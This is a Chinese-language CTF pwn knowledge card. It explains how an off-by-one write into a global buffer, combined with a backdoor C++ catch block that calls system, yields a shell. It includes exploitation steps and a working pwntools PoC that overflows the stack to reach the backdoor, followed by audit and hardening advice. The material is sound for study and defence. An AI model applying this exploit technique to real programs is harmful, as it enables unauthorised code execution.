---
id: ctf-pwn-cpp-exception-payload-src-system-command
title: C++ 异常对象指向可控全局缓冲区：catch 把 __cxa_begin_catch 返回值当命令交给 system
type: scenario
domain: ctf
path: ctf/pwn
technique: cpp-exception-object-pointer-system-command
aliases:
- __cxa_begin_catch 命令执行
- C++ 异常对象劫持
- catch 后门 system
- exception 指向 src
- trace 越界写 src
tags:
- ctf
- pwn
- cpp
- cxx-exception
- cxa-begin-catch
- system
- off-by-one
- stack-overflow
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V272
  verified_at: '2026-11-08T00:16:19+08:00'
  notes: 已对照原文与全部13张图核对：图01 main 菜单（1 trace/2 warn/3 exit）、图02 trace 循环 i<=8 与 list[16*i+read_len]=0 off-by-null、图03 .data list[128]@0x404020 与 src@0x4040A0（src=list+0x80）、图11 warn 的 read 0x100+HIBYTE 处理+memcpy/strcpy/strncat+__cxa_allocate_exception/__cxa_throw、图12 catch(char const*) 反汇编 __cxa_begin_catch 返回值经 [rbp+command] 传递后 call __system。卡片 exp 与原文 line 123-137 一致（8 次 a*0x10 后第 9 次 /bin/sh，warn message 0x70 填充 + bss+0x800 + 0x401BC7）。单卡单一原子（异常对象指针指向可控全局 + catch 误用运行时返回值作 system 参数），无需拆分。未验证点：原文未附最终 shell 成功截图，卡片 confidence medium，未本机复跑；无版本。dup-scan 中与 14881（伪造 C++ 异常展开帧绕过 canary ROP）pair 判 related，两条链入口/原语/sink 不同，均保留；dedup 仅自身草稿命中。
---

## 一句话结论

程序用 `__cxa_allocate_exception` 分配的异常对象保存一个指向全局缓冲区 `src` 的指针，而“后门” catch 分支把 `__cxa_begin_catch` 的返回值直接当成命令字符串传给 `system`；先用 `trace()` 的越界写把 `src` 改写为 `/bin/sh`，再选择 `warn()` 触发异常，即可让 `system` 执行攻击者控制的字符串拿到 shell。

## 原理

- 目标结构中 `list[128]`（`.data` 0x404020）与 `src`（0x4040A0）相邻，`src = list + 0x80`。
- `trace()` 的循环本应只处理 8 条记录，但写成 `for (i = 0; i <= 8 && list[16*i]; ++i)`：
  - 每条记录 `read(0, &list[16*i], 0x10)` 后执行 `list[16*i + read_len] = 0`，存在 off-by-null；
  - 当 `i == 8` 时写入目标正好是 `list + 0x80 = src`，即第 9 条记录可以覆盖 `src` 最多 0x10 字节，并可在其后补 NUL 截断。
- `warn()` 中：
  ```c
  exception = __cxa_allocate_exception(8uLL);
  *exception = src;                 // 异常对象 payload = 指向 src 的指针
  __cxa_throw(exception, &typeinfo_for_char_ptr, 0);
  ```
- 二进制里存在一个 catch(char const*) 分支（后门）：
  ```asm
  mov  rdi, rax
  call __cxa_begin_catch
  mov  [rbp+command], rax
  ...
  mov  rdi, rax
  call __system
  ```
  它把 C++ 异常运行时返回的异常对象相关指针当作 C 字符串直接传给 `system`。由于异常对象内容是 `src` 指针，配合上一步把 `src` 写成 `/bin/sh`，命令执行落在攻击者可控的缓冲区上。
- 为什么成立的关键点有两个：
  1. 异常对象（而不是普通栈变量）保存了指向攻击者可控全局缓冲区的指针，异常机制本身跨过了“只能操作栈”的限制；
  2. catch 处理函数没有校验 `__cxa_begin_catch` 的返回语义，直接把它当命令串使用——正常 C++ 代码会取 catch 形参（如 `char* e`）而不是裸的运行时返回值。

## 触发条件

- 菜单程序存在 `trace()` 之类的固定 0x10 记录功能，且记录数组与可写全局缓冲区相邻、循环边界多算一条；
- 存在 `__cxa_throw` 抛指针类型异常的路径，且 catch 分支把 `__cxa_begin_catch` 返回值当字符串使用（后门/错误实现）；
- 第 9 条记录可写入 `src`（本例 0x10 字节足够放 `/bin/sh\x00`）。

## 利用步骤

1. 连续 8 次调用 `trace()`，每次发送 0x10 字节（如 `a`*0x10）并选择不查看记录，把 `list` 填满；此时 `i` 走到 8。
2. 第 9 次调用 `trace()`，发送 `/bin/sh\x00`，写到 `list + 0x80 = src`。
3. 选择菜单项 `warn()` 触发 `__cxa_throw`。
4. `warn()` 的 message 输入还存在 0x70 栈溢出：发送 `0x70 * 'A' + p64(bss+0x800) + p64(0x401BC7) + cyclic(0x20)`，把 saved rbp 指到 BSS、返回地址指向 catch 后门块（0x401BC7）并预留后续槽位。
5. 异常/后门路径把 `src` 交给 `system`，得到 `/bin/sh`（随后 `p.interactive()`）。

## PoC

```python
from pwn import *
context(os='linux', arch='amd64')
p = process('./pwn')
menu = 'Your chocie:'
for _ in range(8):
    p.sendlineafter(menu, '1')
    p.sendafter('You can record log details here: ', b'a' * 0x10)
    p.sendlineafter('Do you need to check the records? ', 'n')
p.sendlineafter(menu, '1')
p.sendafter('You can record log details here: ', b'/bin/sh\x00')
p.sendlineafter('Do you need to check the records? ', 'n')
p.sendlineafter(menu, '2')
p.sendlineafter('message', b'A' * 0x70 + p64(0x4040E0 + 0x800) + p64(0x401BC7) + cyclic(0x20))
p.interactive()
```

## 变体与关联

- 变体：把 `src` 换成任意可写全局缓冲区、把 `/bin/sh` 换成任意命令；核心是“异常对象 payload 指向可控内存 + catch 用运行时返回值作 sink”。
- 关联：`__cxa_allocate_exception` / `__cxa_throw` / `__cxa_begin_catch` 是 Itanium C++ ABI 的标准异常入口，遇到异常处理代码时应重点审计 catch 分支对返回值的用法；同类的语言运行时劫持思路可参考 [[binary-pwn-stack-pivot-leave-ret-bss]] 之外的控制流劫持卡（按 sink 关联）。

## 检测与防御

- 代码审计：搜索 `__cxa_begin_catch` 返回值直接传给 `system`/`popen`/`exec*` 的写法；catch 块必须使用类型正确的 catch 形参，不能把运行时内部指针当业务字符串。
- 边界修复：`trace()` 循环应为 `i < 8`，并同时校验记录长度（`read_len` 不得让 `list[16*i + read_len]` 越界）。
- 编译加固：开启 stack canary、FORTIFY_SOURCE；对高权限程序禁止把异常文本/异常对象直接交给 shell。
- 运行防护：`system` 参数应来自白名单常量；捕获异常后只记录固定文案，不回显或执行异常内容。
